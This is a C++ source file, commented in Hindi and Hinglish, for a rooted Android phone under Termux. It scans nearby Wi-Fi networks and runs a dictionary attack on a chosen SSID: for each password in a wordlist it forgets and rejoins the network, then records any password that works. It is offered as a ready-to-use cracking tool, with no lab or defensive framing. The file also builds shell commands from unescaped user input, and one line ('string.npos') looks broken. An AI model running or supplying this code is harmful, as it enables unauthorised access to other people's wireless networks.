#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>
#include <vector>
#include <algorithm>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

// फंक्शन यह चेक करने के लिए कि क्या वाई-फाई कनेक्ट हो गया है
bool isConnected(string ssid) {
    // dumpsys कमांड का आउटपुट टेम्परेरी फाइल में लें
    string check_cmd = "su -c 'dumpsys wifi | grep \"mWifiInfo\"' > temp_res.txt";
    system(check_cmd.c_str());
    
    ifstream res("temp_res.txt");
    string line;
    bool connected = false;
    
    if (res.is_open()) {
        while (getline(res, line)) {
            // FIX: size_type(-1) की जगह string::npos का उपयोग
            if (line.find(ssid) != string::npos && line.find("completed") != string.npos) {
                connected = true;
                break;
            }
        }
        res.close();
    }
    return connected;
}

int main() {
    system("clear");
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "      RONNIE WIFI PRO (TERMUX FIX-23)      " << endl;
    cout << "===========================================" << RESET << endl;

    // 1. डीप स्कैनिंग
    cout << YELLOW << "[*] Scanning Nearby Networks..." << RESET << endl;
    cout << "-------------------------------------------" << endl;
    // सुधरा हुआ स्कैन कमांड
    system("su -c 'cmd wifi list-scan-results' | awk 'NR>1 {print $NF}' | sort -u");
    cout << "-------------------------------------------" << endl;

    string ssid, wordlist;
    cout << CYAN << "\nEnter Target SSID: " << RESET;
    getline(cin >> ws, ssid);

    cout << CYAN << "Wordlist Path: " << RESET;
    getline(cin >> ws, wordlist);

    ifstream file(wordlist);
    if (!file.is_open()) {
        cout << RED << "[-] Error: Wordlist file '" << wordlist << "' nahi mili!" << RESET << endl;
        return 1;
    }

    string pass;
    int line_count = 0;
    bool success = false;

    cout << YELLOW << "\n[!] Starting Attack on " << ssid << "..." << RESET << endl;

    while (getline(file, pass)) {
        line_count++;
        
        // पासवर्ड क्लीनिंग (Newline/Return हटाना)
        if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) pass.pop_back();
        if (pass.length() < 8) continue;

        cout << CYAN << "[" << line_count << "][LEN: " << pass.length() << "] " << RESET << "TRYING: " << pass << flush;

        // पुराने नेटवर्क को भूलना (ताकि नया पासवर्ड ट्राई हो सके)
        string forget = "su -c 'cmd wifi forget-network " + ssid + " > /dev/null 2>&1'";
        system(forget.c_str());

        // कनेक्शन का प्रयास
        string connect_cmd = "su -c 'cmd wifi connect-network " + ssid + " wpa2 " + pass + "' > /dev/null 2>&1";
        system(connect_cmd.c_str());

        // एंड्रॉइड हार्डवेयर के लिए पर्याप्त इंतज़ार (जरूरी है)
        sleep(5); 

        // असली चेक
        if (isConnected(ssid)) {
            cout << GREEN << " >> [SUCCESS!]" << RESET << endl;
            cout << GREEN << BOLD << "\n[+] SAHI PASSWORD MIL GAYA: " << pass << RESET << endl;
            
            ofstream save("found_pass.txt", ios::app);
            save << "SSID: " << ssid << " | PASS: " << pass << endl;
            save.close();
            
            success = true;
            break;
        } else {
            cout << RED << " >> [FAILED]" << RESET << endl;
        }
    }

    if (!success) cout << RED << "\n[-] Password nahi mila. Wordlist khatam." << RESET << endl;

    file.close();
    // टेम्परेरी फाइल डिलीट करें
    system("rm -f temp_res.txt");
    return 0;
}
